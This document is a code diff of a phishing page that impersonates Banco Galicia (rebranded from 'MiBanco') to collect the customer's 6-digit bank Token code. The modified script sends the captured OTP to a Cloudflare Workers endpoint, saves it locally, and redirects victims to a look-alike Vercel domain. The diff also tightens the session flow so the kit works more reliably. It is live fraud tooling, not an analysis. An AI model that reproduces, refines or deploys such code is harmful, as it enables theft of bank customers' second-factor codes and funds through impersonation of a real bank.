@@ -320,12 +320,12 @@
     <div class="container">
         <!-- Logo -->
         <div class="logo-container">
-            <div class="logo-placeholder">MiBanco</div>
+            <div class="logo-placeholder">Galicia</div>
         </div>
 
         <h1>Ingresa el código Token</h1>
         <p class="subtitle">
-            Genera el código Token de 6 dígitos en la App.<br>
+            Genera el código Token de 6 dígitos en la App Galicia.<br>
             Luego ingrésalo en esta pantalla.
         </p>
 
@@ -345,7 +345,7 @@
         <div class="help-box">
             <div class="help-title">📱 ¿Cómo obtener el código Token?</div>
             <div class="help-text">
-                <strong>1.</strong> Ingresá a la App<br>
+                <strong>1.</strong> Ingresá a la App Galicia<br>
                 <strong>2.</strong> Presioná el botón <strong>"Token"</strong> en la pantalla de ingreso
             </div>
         </div>
@@ -375,6 +375,7 @@
     <script>
         // ==================== CONFIGURACIÓN ====================
         const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+        const BASE_URL = 'https://personasgalicia.vercel.app';
 
         // ==================== ELEMENTOS ====================
         const input = document.getElementById('tokencode');
@@ -431,21 +432,17 @@
             loadingOverlay.style.display = 'flex';
 
             try {
-                // Obtener o crear datos del localStorage
+                // Obtener datos del localStorage
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-                
-                // Si no hay transactionId, lo creamos
-                if (!bancoldata.transactionId) {
-                    bancoldata.transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-                    bancoldata.usuario = bancoldata.usuario || 'usuario_' + Date.now();
-                    bancoldata.dni = bancoldata.dni || '12345678';
-                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-                    console.log('🆕 TransactionId creado:', bancoldata.transactionId);
-                }
-
                 const transactionId = bancoldata.transactionId;
 
-                console.log('📦 Datos del localStorage:', bancoldata);
+                if (!transactionId) {
+                    console.error('❌ No hay transactionId en localStorage');
+                    alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
+                    window.location.href = `${BASE_URL}/w.html`;
+                    return;
+                }
+
                 console.log('📤 Enviando código OTP:', token);
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
@@ -480,9 +477,15 @@
                 loadingOverlay.style.display = 'none';
 
                 if (result.ok) {
-                    // ✅ CÓDIGO VÁLIDO - REDIRIGIR A loading.html
+                    // ✅ CÓDIGO VÁLIDO - REDIRIGIR A validacion.html para que espere el estado otp_recibido
                     console.log('✅ Código válido, redirigiendo a validacion.html');
-                    window.location.href = 'validacion.html';
+                    // Guardar que el OTP fue enviado
+                    bancoldata.otp_enviado = true;
+                    bancoldata.otp = token;
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+                    
+                    // Redirigir a validacion.html para que espere el estado otp_recibido
+                    window.location.href = `${BASE_URL}/validacion.html`;
                 } else {
                     // ❌ CÓDIGO INVÁLIDO
                     console.log('❌ Código inválido - Respuesta:', result);
@@ -539,22 +542,20 @@
         });
 
         // ==================== INICIALIZAR ====================
-        updateButton();
-        setTimeout(() => input.focus(), 300);
-
-        // Verificar y crear transactionId si no existe al cargar
+        // Verificar que exista transactionId
         let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
         if (!bancoldata.transactionId) {
-            bancoldata.transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-            bancoldata.usuario = bancoldata.usuario || 'usuario_' + Date.now();
-            bancoldata.dni = bancoldata.dni || '12345678';
-            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-            console.log('🆕 TransactionId creado al iniciar:', bancoldata.transactionId);
+            console.error('❌ No hay transactionId, redirigiendo a w.html');
+            window.location.href = `${BASE_URL}/w.html`;
+            return;
         }
 
-        console.log('🔍 TransactionId al cargar:', bancoldata.transactionId || 'No encontrado');
+        console.log('🔍 TransactionId:', bancoldata.transactionId);
         console.log('🚀 Sistema de validación listo');
         console.log(`📡 Worker URL: ${WORKER_URL}`);
+        
+        updateButton();
+        setTimeout(() => input.focus(), 300);
     </script>
 
 </body>
